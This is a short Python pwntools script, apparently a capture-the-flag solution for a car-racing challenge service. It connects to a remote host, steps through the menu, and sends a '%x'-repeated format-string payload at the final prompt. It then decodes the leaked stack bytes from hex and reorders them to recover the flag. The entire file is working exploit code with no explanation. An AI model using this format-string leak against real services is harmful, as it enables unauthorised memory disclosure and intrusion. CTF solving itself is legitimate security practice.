from pwn import *

ip = "138.68.151.223:32095"

payload = "%x"*100

conn = remote(ip.split(':')[0], ip.split(':')[1])
conn.sendlineafter(b'Name', b'ayu')
conn.sendlineafter(b'Nickname', b'ayu')
conn.sendlineafter(b'selection', b'2')
conn.sendlineafter(b'car', b'1')
conn.sendlineafter(b'race', b'2')
conn.sendlineafter(b'victory?', bytes(payload, encoding='utf-8'))
flag = conn.recvall().decode('utf-8')
flag = bytes.fromhex(flag[163:251])
print(flag)
final = [chr(61)]*len(flag)
for i in range(len(flag)):
    val = (((i%4)+1)*3)%4
    index = ((i//4)*4)+val
    if index >=len(flag):
        break
    final[index] = chr(flag[i])
print(final)
print("".join(final))
conn.close()

